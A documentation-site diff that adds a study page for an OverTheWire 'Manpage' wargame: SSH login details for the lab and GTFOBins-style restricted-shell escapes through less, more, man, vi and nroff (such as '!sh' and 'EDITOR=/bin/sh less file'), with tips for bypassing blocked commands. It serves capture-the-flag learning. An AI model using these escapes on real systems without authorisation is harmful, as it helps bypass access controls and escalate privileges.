@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#manpage" class="md-skip">
           Skip to content
         </a>
       
@@ -1709,6 +1709,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Manpage
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1725,6 +1743,69 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#connection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Connection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#core-technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Core Technique
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gtfobins-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GTFOBins Reference
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tips
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2837,6 +2918,58 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#connection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Connection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#core-technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Core Technique
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gtfobins-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GTFOBins Reference
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tips
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2855,7 +2988,57 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="manpage">Manpage<a class="headerlink" href="#manpage" title="Permanent link">&para;</a></h1>
+<p><strong>Difficulty:</strong> Hard | <strong>Topics:</strong> GTFOBins — man page abuse, pager exploitation, restricted shell escape</p>
+<p>Exploitation through Unix man page viewers and pagers. Levels involve abusing <code>man</code>, <code>less</code>, <code>more</code>, <code>nroff</code>, and related utilities to escape restricted environments or elevate privileges.</p>
+<h2 id="connection">Connection<a class="headerlink" href="#connection" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ssh<span class="w"> </span>manpage0@manpage.labs.overthewire.org<span class="w"> </span>-p<span class="w"> </span><span class="m">2224</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># Password: manpage0</span>
+</span></code></pre></div>
+<h2 id="core-technique">Core Technique<a class="headerlink" href="#core-technique" title="Permanent link">&para;</a></h2>
+<p>Man pages are rendered by pagers (<code>less</code>, <code>more</code>). These pagers can execute shell commands:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Inside less/more:
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>!sh          # spawn shell
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>!/bin/bash   # spawn bash
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>v            # open $EDITOR (vi → :!/bin/sh)
+</span></code></pre></div>
+<h2 id="gtfobins-reference">GTFOBins Reference<a class="headerlink" href="#gtfobins-reference" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Binary</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>less</code></td>
+<td><code>!sh</code> inside pager</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td><code>!sh</code> inside pager (needs large enough terminal)</td>
+</tr>
+<tr>
+<td><code>man</code></td>
+<td>Invokes pager — same as above</td>
+</tr>
+<tr>
+<td><code>vi/vim</code></td>
+<td><code>:!/bin/sh</code> or <code>:set shell=/bin/sh :shell</code></td>
+</tr>
+<tr>
+<td><code>nroff</code></td>
+<td>Pipe to shell via macros</td>
+</tr>
+</tbody>
+</table>
+<h2 id="tips">Tips<a class="headerlink" href="#tips" title="Permanent link">&para;</a></h2>
+<ul>
+<li>If <code>!sh</code> is blocked, try <code>!/bin/sh</code>, <code>!bash</code>, or <code>!id</code></li>
+<li>Make terminal small to force paging in <code>more</code></li>
+<li><code>v</code> in <code>less</code> opens <code>$EDITOR</code> — set it: <code>EDITOR=/bin/sh less file</code></li>
+</ul>
 
 
 
